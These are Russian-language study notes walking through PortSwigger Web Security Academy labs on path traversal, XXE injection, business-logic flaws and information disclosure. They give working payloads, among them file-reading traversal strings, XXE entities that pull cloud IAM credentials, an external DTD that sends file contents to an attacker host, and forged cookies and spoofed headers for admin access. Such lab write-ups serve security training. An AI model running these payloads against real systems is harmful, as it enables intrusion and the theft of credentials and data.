# Path Traversal
## Simple case
### [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
Открываем продукт с включенным intercept-ом в бурпе.

Видим `GET /image?filename=16.jpg`. Отправляем в репитер.

Сначала пробуем абсолютный путь - `/etc/passwd`. Не работает, значит ставим `../etc/passwd` и т.д.

`GET /image?filename=../../../etc/passwd` приводит к выполненной лабе
## Defense bypass
### [File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
Ещё проще, как и пытались изначально, используем абсолютный `/etc/passwd`.
### [File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
Из названия понимаем, что имеет смысл добавить лишних `../`, чтобы убрало их, но при этом оставило нужные.

Я соорудил такую конструкцию: `....//....//....//etc/passwd`
### [File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
Абсолютный путь показывает 400 с `"No such file"`, что, кстати, показывает, что path traversal здесь возможен.

Что интересно, добавление `../` не приводит к срабатыванию какого-либо фильтра, но и файл нам не выдаёт.

Получается, он как-то скрыто их отбрасывает? Попробуем url encode, но одинарный ничего не даёт. А вот двойной срабатывает!!
### [File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
Видим прописанный абсолютный путь - `/var/www/images/47.jpg`.

Пробуем заменить его на свой - `/etc/passwd`. Не работает.

Тогда переходим к относительным путям. Тот факт, что мы видим путь целиком, нам помогает не перебирать количество `../`, а сразу поставить нужное - `/var/www/images/../../../etc/passwd`.
### [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
`/etc/passwd` и `../../../etc/passwd` ни к чему не приводят, как и url-кодирование.

Получается, пробуем ещё одно возможное изменение - добавить требуемое расширение файла. Чтобы при этом всё ещё получить именно `/etc/passwd`, расширение мы добавим через null-байт, который отрежет всё, что стоит правее его - `/etc/passwd%00.png`

# XML external entity (XXE) injection
Общий кусок теории - зачастую, прямо как в SQLi, придётся искать поле, через которое может утечь инфа.
## Retrieving files
### [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
Чекаем сток и видим, что передаётся следующий запрос:
```xml 
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>1</productId>
		<storeId>1</storeId>
	</stockCheck>
```
Добавим туда свою строку: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` и затем в productId закидываем её же, итоговый запрос выглядит так:
```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<stockCheck>
		<productId>&xxe;</productId>
		<storeId>1</storeId>
	</stockCheck>
```
Ответ получаем интересный:
`"Invalid product ID: root:x:0:0:root:/root:/bin/bash...`

То есть фактически мы устраивает утечку через показ ошибки, и без него бы атака не прошла (или по крайней мере пришлось бы использовать blind методы).
## XXE leading to SSRF
### [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
Пейлоад как в прошлом случае, но заменяем `file://...` на `http://169.254.169.254/`. Видим, что там есть эндпоинт `latest`, добавляем его к адресу и так по цепочке до `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`.

Важно не забывать протокол (http:// или другой).
## Blind XXE
### [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
Вариант абсолютно аналогичный предыдущему, чисто URL заменить на наш.
### [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
Вариант, всё так же похожий на предыдущие два, но вот только в чистом виде XML External Entities заблокированы, так что придётся немного изменить запрос - вызвать сущность прямо в объявлении DOM, такая сущность будет называться параметрической сущностью (parameter entity). Для такого надо поставить `%` перед сущностью: 
`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "pc58w4j8f1dghys22iw73lbgf7ly9pxe.oastify.com"> %xxe; ]>`
### [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
На свой сервер злоумышленника закидываем пейлоад:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname"> 
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> 
%eval; 
%exfiltrate;
```
Соответственно, алгоритм такой:
1. Закидываем содержимое нужного файла в переменную (параметрическую сущность) `file`.
2. Объявляем сущность eval, в которой динамически объявляется новая сущность - exfiltrate, которая через get-запрос сливает содержимое файла на наш сервер (кстати, &#x25 это просто процент в hex-коде).

Это кладём на сервер, к примеру в `http://web-attacker.com/malicious.dtd` и затем встраиваем в xml сервера следующее:
`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>`

При таком варианте важно заметить, что многострочный файл, скорее всего, не получится вывести, поскольку мы передаём в url, который с энтерами не дружит.
### [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)
Абузим сообщения об ошибке, сюдаааа.

Нам советуют следующий пейлоад:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> 
%eval; 
%error;
```
Пробуем вкинуть это в чистом виде, но защита не позволяет. Значит, грузим на свой сервер и затем получаем той же командой:
`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a6800520317743d8067c04b01df00c1.exploit-server.net/malicious.dtd"> %xxe;]>`
### [Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)
Вуф, экспертная лаба.

К ней сразу дана подсказка: Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso.`

То есть мы сразу проскипали этап поиска DTD и обнаружения подходящей сущности в нём, иначе бы можно было это сделать по списку частых DTD и следующий пейлоад (если файла нет, будет ошибка, иначе норм): 
```
<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>
```

А теперь идём писать итоговый пейлоад:
```
<!DOCTYPE message [ 
	<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
	<!ENTITY % ISOamso ' 
		<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
		<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> 
		&#x25;eval; 
		&#x25;error; 
	'> 
	%local_dtd; 
]>
```
Что здесь происходит: TODO объяснить
1. Импортируем в параметрическую сущность local_dtd существующий в системе DTD файл.
2. Знаем, что у него есть своя сущность ISOamso, которая имеет нужный формат и вызывается в нужном месте. Перезаписываем её нашим стандартным пейлоадом для вывода файла через сообщение об ошибке.
## Finding hidden attack surface
В предыдущих случаях мы явно видели запрос с XML-ем. Это не единственный вариант, когда можно стриггерить XXE.
### [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
XInclude позволяет строить итоговый XML из маленьких кусков. В общем случе бы у нас не было доступа к DTD всего XML-а, если мы можем менять только одно поле, однако XInclude позволяет объявить свой мини-DTD даже внутри поля.

Типичный XInclude пейлоад выглядит так:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

В valid-запросе видим только `productId=1&storeId=1`, ставим productId=*payload*.
### [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
Пользуемся тем фактом, что некоторые форматы, вроде DOCX или SVG, внутри себя представляют из себя XML-файл.

Типичный пейлоад для SVG:
``` xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
## Другие полезные подходы без практики
Даже если изначальный тип запрос стандартный `Content-Type: application/x-www-form-urlencoded`, всё равно можно попробовать самостоятельно его поменять на `text/xml`.

Ещё у бурпа есть достаточно удобный встроенный инструмент поиска XXE в web vulnerability scanner.

Ну и ещё, даже если видим xml, пробуем не только XXE, но и более стандартные XSS, SQLi, и ещё xml позволяет [obfuscate your attack](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding)

# Business logic
## Excessive trust in client-side controls
### [Excessive trust in client-side controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)
При добавлении продукта в корзину видим POST-запрос со следующим содержимым: `productId=1&redir=PRODUCT&quantity=1&price=133700`.

Меняем price на 1 и готово.
### [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)
[[Auth JWT portswigger#[2FA broken logic](https //portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)|2FA broken logic]]
## Failing to handle unconventional input
### [High-level logic vulnerability](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level)
Добавление товара в корзину - `productId=1&redir=PRODUCT&quantity=1`.

Пытаемся поставить quantity=-1, получается, но заказ оформить не можем - цена не может быть меньше нуля.

А что если добавить 1 куртку и -13 товаров по 100$? Тогда куртку нам могут доставить, и выйдет она в 37 долларов.

Что, кстати, интересно, на фронте он запрещает ставить значение <0, а вот в бурпе можем спокойно.

![[Path Traversal, XXE, Business Logic Vulnerabilities и Information Disclosure portswigger-1763394828628.webp]]
### [Low-level logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level)
По названию есть догадка, что тут можно вызвать переполнение инта.

Первое потенциальное значение в `65 535` он переваривает спокойно.

Быстро находим, что за раз он максимум даёт добавить 99 предметов, но ничего не мешает отправить запрос несколько раз.

Через интрудер я повторил атаку много раз и обнаружил, что мы действительно встретили переполнение - после 2 147 483 647 значение стало отрицательным.

Теперь осталось посчитать, сколько надо добавить товаров, чтобы значение было в диапазоне `[0;100]`, для этого просто `2147483647 * 2 / 133700 / 99` (цену домножаем на 100, потому что она указана в центах). Получаем 324, столько раз отправляем запрос на добавление 99 курток.

Где-то мы слегка просчитались, так что значение всё ещё отрицательное. Делим его на 1337, видим, что нужно ещё 938 курток

Отправляем ещё 9 пейлоадов на 99, но складывается ощущение, что не все запросы обрабатываются. В общем, теперь уже просто вручную доотправляем нужные запросы репитером, причем последний получается не на 99, а на 47.

При этом итоговая цена получается чуть больше - 115$, так что убираем одну куртку и баланс до положительного докидываем чем-то более дешевым.

![[Path Traversal, XXE, Business Logic Vulnerabilities и Information Disclosure portswigger-1763396076142.webp]]

### [Inconsistent handling of exceptional input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)
Первая мысль была использовать почту вроде `wiener%40dontwannacry.com@exploit-0abf00bf049fb7f8863d61d801a7008b.exploit-server.net`, ей дало зарегаться, но админки на ней не было. А если наоборот поставить кодирование? Тоже ничего, исследуем другие вектора атаки.

Ещё одним способом обойти такой whitelist может стать очень долгая строка. Я использовал следующую строку длиной 230 символов (без учета @...):
```
01234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121@exploit-0a09003203e534c9818eba71010700c0.exploit-server.net
```
Ничего не помешало нам её использовать, даже на фронте, и сообщение пришло успешно. Оно содержит все 230+ символов адреса.

А вот при заходе в свой аккаунт мы видим, что обрезалась часть доменного имени, итоговая длина сохранившегося имени - 255.

Два доменных имени и две @ сервер не пропустит, мы уже проверяли. А что если поставить доменное имя `@dontwannacry.com.exploit-0a09003203e534c9818eba71010700c0.exploit-server.net` и сделать так, чтобы наше доменное имя обрезалось (то есть чтобы .com кончалось 255-м символом)?
```
0123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115@dontwannacry.com.exploit-0a09003203e534c9818eba71010700c0.exploit-server.net
```
## Making flawed assumptions about user behavior
### [Inconsistent security controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls)
По уровню сложности лабы понятно, что тут должно быть что-то очевидное. Проверяем тела всех запросов, но видим, что как-то надо получить email `@dontwannacry.com`.

Зарегаться с ним не даёт, потому что нужен доступ к почте, а вот после регистрации сменить его в личном кабинете можно без всяких проверок.
### [Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)
Тыкаемся, панелька смены пароля выглядит очень вкусно.

Перед этим шел кусок теории про то, как иногда можно выкидывать некоторые значения параметров, а то и их объявления тоже, так что запрос
`csrf=5bpOMm4qH1gDio62VPcySHXmMKI70yv0&username=wiener&current-password=peter&new-password-1=peter&new-password-2=peter` легким движением руки превращается в `csrf=5bpOMm4qH1gDio62VPcySHXmMKI70yv0&username=administrator&new-password-1=peter&new-password-2=peter`.
### [Insufficient workflow validation](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)
Полностью проходим по процессу покупки товара.

Видим, что последний запрос - GET на `/cart/order-confirmation?order-confirmed=true`. Добавим нашу куртку в корзину и попробуем снова послать GET сюда - и внезапно лаба выполнена.
### [Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)
Сначала вводим данные, потом выбираем роль.

Выбор роли до данных приводит к 400, как и повторный выбор роли после входа.

Если мы после ввода данных пытаемся зайти на страницу админа, то у нас ничего не получается.

А вот если сразу после ввода данных отправить POST-запрос с данными и дропнуть GET-запрос на выбор роли, то наша роль дефолтится на админа.
## Domain-specific flaws
### [Flawed enforcement of business rules](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules)
Видим промокод `NEWCUST5`, который снижает цену на 5 долларов. Пробуем прислать несколько раз запрос с ним, но безуспешно.

Внизу страницы видим подписку на рассылку, за которую выдают промокод `SIGNUP30`, он срезает цену на 30%.

Я пробовал че-то сложное, но в итоге всё оказалось просто - дважды подряд один и тот же код не ввести, а вот по очереди их можно вводить неограниченно.
### [Infinite money logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)
Название уже классное, надо будет потом в жизни попробовать.

Видим гифт карты, видимо, уязвимость связана с ними.

Видим тот же купон `SIGNUP30` на 30%.

Накупили гифт карт на все деньги, их выдало списком. Скопировал его и интрудером использовал все.

В итоге вручную получилось долговато, есть ощущение, что это можно было удобно автоматизировать. В райтапе есть инфа о том, как это сделать.
## Криптография!!
### [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
В логине видим новую кнопку stay logged in, она нам выставляет cookie - `epHd1or9onyKMvt56qYhZC7PX9nuR61mPVbztnDRvvI%3d`, URL decode показывает = на конце, значит это строка в Base64, но раскодируется она во что-то невнятное, из чего складывается ощущение, что это просто некоторая бинарная последовательность.

После этого я слегка пришел в тупик - попробовал прогнать строку через разные анализаторы шифров, но даже сам шифр определить не получилось. Есть только обоснованное предположение, что в реальности бы использовался какой-нибудь AES, но вот он неуязвим к атакам оракулом, так что должно быть что-то другое.

Так что я зашел в тупик и пошел смотреть райтап. Согласно ему, надо отправить коммент в невалидным email, тогда нам выставить новый cookie: `notification=EYZOFJjYJv%2f3x1Ut5GFsDCAAC0Ke5p0xC26zM0yz0hs%3d`, а сверху страницы получаем сообщение: `Invalid email address: email`. Отсюда предположение, что чтобы показать это сообщение, он расшифровал ту самую cookie, и соответственно мы можем таким образом зашифровывать и расшифровывать что захотим. 

Прокинем туда нашую stay-logged-in cookie и получим: wiener:1763751739159.

Попробуем заменить wiener на administrator и зашифровать. Супер, нам действительно пишется `Invalid email address: administrator:1763751739159`, правда первую часть надо как-то убрать. Занимает она 23 символа, имеет смысл предположить, что это 23 байта. Тогда закидываем в cybershef: From Base64 -> From HEX, убираем 23 байта и затем проводим обратную операцию. Получаем `LWpRvK2DZf5p44uCFo46873fW%2FyPqXJ8N1yWmw0Jjb8Kqy3bnrtNZZw%3D`. Ставим это в notification и получаем `Input length must be multiple of 16 when decrypting with padded cipher`. 

Получается, надо докинуть 9 символов, зашифровать и откинуть 32 байта. Тогда email ставим `xxxxxxxxxadministrator:1763751739159`, после манипуляций получаем `RV6%2B%2FsvyNOARkLxo5byKH9FI5s5IX3fdeT%2BCewqoaQc%3D`. Проверяем его здесь и оно действительно расшифровывается верно.

Всё, убираем сессионную куки, ставим эту в stay-logged-in и гг вп.
### [Bypassing access controls using email address parsing discrepancies](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies)
#### Краткая теория
[Очень интересная, но длинная статья о способах обхода фильтров по email](https://portswigger.net/research/splitting-the-email-atom).
##### Escapes
```
"@"@example.com  
"\""@example.com
```
##### Comments
`(foo)user@(bar)example.com`
##### UUCP
Протокол до мэйла и интернета, в нем вместо адрес@домен идёт домен!адрес.
##### [Source routes](https://www.jochentopf.com/email/address.html#sourcerouting)
`collab%psres.net(@example.com`
% интерпретируется как @, а ( открывает комментарий.
##### Unicode overflows
Некоторые парсеры, к примеру PHP-шный, могут переполняться в значениях символов - в таком случае берется не сам символ, а символ с его номером по модулю 256 
`String.fromCodePoint(0x100 + 0x40) // ŀ → @`
##### Использование кодировок внутри адреса
Это полноценно надо перечитать на самом сайте.
![[Path Traversal, XXE, Business Logic Vulnerabilities и Information Disclosure portswigger-1764166829361.webp]]
![[Path Traversal, XXE, Business Logic Vulnerabilities и Information Disclosure portswigger-1764166852472.webp]]
Реальная уязвимость гитхаба (явно пофикшенная)
![[Path Traversal, XXE, Business Logic Vulnerabilities и Information Disclosure portswigger-1764166866483.webp]]
#### Практика
Итак, попробуем применить наши знания на практике.

Пробуем зарегаться со своего домена, нам не разрешает, нужен домен `@ginandjuice.shop`.

Просто добавить коммент (@ginandjuice.shop) не даёт.

`wiener%exploit-0a9200f40381c18f80ab2ade019b00e1.exploit-server.net@ginandjuice.shop` успешно отправился, но наш домен не пришел, добавление скобки не позволяет отправить, как и поменять местами и получить `wiener@ginandjuice.shop%exploit-0a9200f40381c18f80ab2ade019b00e1.exploit-server.net`.

В итоге идем заниматься кодировками.

Первый вариант.- через iso8859 - 
```
=?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop
```
Что должно раскодироваться в `abcfoo@ginandjuice.shop`.

Получаем `Registration blocked for security reasons`, вау.

Попробуем использовать не ISO, а UTF-8:
```
=?utf-8?q?=61=62=63?=foo@ginandjuice.shop
```
Ошибка та же.

Закрадывается предположение, что тут любые кодировки заблокированы, но попробуем менее распространённую UTF-7 (хотя в этом контексте она вполне частая).
```
=?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop
```
И на удивление, это проходит! Тогда осталось подставить наш адрес в кодировку и готово. Выглядит это так:
```
=?utf-7?q?attacker&AEA-exploit-0a9200f40381c18f80ab2ade019b00e1.exploit-server.net&ACA-?=@ginandjuice.shop
```
И нам на почту действительно приходит письмо о регистрации! 

Адрес раскодировался в `attacker@exploit-0a9200f40381c18f80ab2ade019b00e1.exploit-server.net`
# Information disclosure
https://portswigger.net/web-security/information-disclosure
## Возможные места появления
- /robots.txt
- /sitemap.xml
- листинг директории при обращении к ней
- комменты во фронтовом коде
- сообщения об ошибке
### [Information disclosure in error messages](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages)
Видим сайт с удивительно ограниченным функционалом.

Предполагаем, что раз мы можем только получать товары, пробуем сломать этот функционал - для начала вводим productId 100, получаем generic ошибку. То же если убрать параметр полностью.

Думаем, какие ещё бывают непредвиденные инпуты - поставим туда букву. И какая удача, необработанная ошибка Java.
### [Information disclosure on debug page](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page)
Пробуем стриггерить старую ошибку, но её пофиксили.

Ищем дальше, смотрим код страницы, в ней коммент - 
```
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```
Переходим туда, видим целую кладезь. Хы-хы-хы. ctrl+F -> SECRET_KEY.
### [Source code disclosure via backup files](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files)
Судя по теории, имеет смысл посмотреть, как текстовые редакторы сохраняют временные файлы при эдитинге. Чаще всего это то же имя файла, но начинающееся с `~`.

Я потыкался по сайту в поиске директории, глянул исходный код - ничего.

Попробовал посмотреть sitemap.xml, снова ничего, а вот robots.txt показывается /backup. И там уже нет контроля доступа, так что получаем код с захардкоженным db connection string.
### [Authentication bypass via information disclosure](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)
В теории говорится о методе TRACE.

Ну что же, попробую отправить запрос логина, но вместо POST поставлю TRACE.

И о чудо, в ответ нам приходит текст запроса с добавленным заголовком:
```
X-Custom-IP-Authorization: 89.175.46.45
```

Я не сразу понял, но нам представлен наш(?) IP.

Попробуем получить доступ к /admin и увидим, что доступ есть только из локалки. 

Сами добавим заголовок:
```
X-Custom-IP-Authorization: 127.0.0.1
```
Готово, лаба решена.
### [Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)
Пробуем получить доступ к /.git и нам сразу позволяет!

При этом в конфиге пароля админа нет, и мы даже можем узнать, что его убрали в последнем коммите.

Я потыкался в браузере, глянул каждый файлик, но так ничего и не нашел. Скачаем директорию через 
```bash
wget -r https://0a21005e04cdb417825406380081005c.web-security-academy.net/.git/
```
И теперь через терминал восстанавливаем пароль следующей последовательностью команд:
```bash
git log
git checkout 6185b0a5fb3813468f7f9bf4b2a6849c81534146
```
То есть через лог смотрим, в каком коммите убрали админский пароль и затем переходим к другому коммиту до этого удаления.